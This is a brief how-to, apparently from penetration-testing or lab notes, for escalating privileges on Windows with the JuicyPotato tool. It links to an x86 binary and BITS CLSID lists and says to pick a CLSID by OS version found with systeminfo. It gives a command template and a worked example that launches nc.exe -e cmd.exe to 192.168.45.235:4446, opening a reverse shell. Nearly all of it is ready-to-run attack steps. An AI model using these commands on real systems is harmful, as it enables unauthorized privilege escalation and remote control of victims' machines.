We can use the following link to get a x86 executable of JuicyPotato.

- https://github.com/ivanitlearning/Juicy-Potato-x86/releases

Then, to get the BITS CSLIDs we use the following link: 

- https://github.com/ohpe/juicy-potato/tree/master/CLSID/


In order to retrieve the correct BITS, we need to know the version of the OS, that we can catch with 'systeminfo'.

Once we have gather the binary and the BITS CSLIDs list, we try with the following command:

- juicy.potato.x86.exe -l 1337 -p <COMMAND> -t * -c <BITS CSLIDs>

For example:

juicy.potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.45.235 4446" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
